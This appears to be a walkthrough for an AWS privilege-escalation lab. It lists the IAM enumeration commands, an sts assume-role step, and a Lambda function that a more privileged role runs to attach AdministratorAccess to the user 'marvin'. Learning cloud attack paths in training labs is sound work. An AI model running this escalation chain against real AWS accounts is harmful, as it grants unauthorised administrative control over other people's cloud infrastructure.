`aws configure --profile marvin`

`aws iam list-attached-user-policies --user-name marvin --profile marvin`

`aws iam get-policy-version --policy-arn <marvin-policy arn> --version-id v1 --profile marvin`

`aws iam list-roles --profile marvin`

`aws iam list-attached-role-policies --role-name debug-role-<uuid> --profile marvin`

`aws iam list-attached-role-policies --role-name lambdaManager-role-<uuid> --profile marvin`

`aws iam get-policy-version --policy-arn <lambdaManager-policy arn> --version-id v1 --profile marvin`

`aws sts assume-role --role-arn <lambdaManager-role arn> --role-session-name lambdaManager --profile marvin`


Then add the lambdaManager credentials to your AWS CLI credentials file at `~/.aws/credentials`) as shown below:

```
[lambdaManager]
aws_access_key_id = {{AccessKeyId}}
aws_secret_access_key = {{SecretAccessKey}}
aws_session_token = {{SessionToken}}
```

python code:

**Note**: The name of the file needs to be `lambda_function.py`.

```python
import boto3
def lambda_handler(event, context):
	client = boto3.client('iam')
	response = client.attach_user_policy(UserName = 'marvin', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
	return response
```

`aws lambda create-function --function-name admin_function --runtime python3.9 --role <cg-debug-role arn> --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.py.zip --profile lambdaManager`

`aws lambda invoke --function-name admin_function out.txt --profile lambdaManager`

`aws iam list-attached-user-policies --user-name marvin --profile marvin`
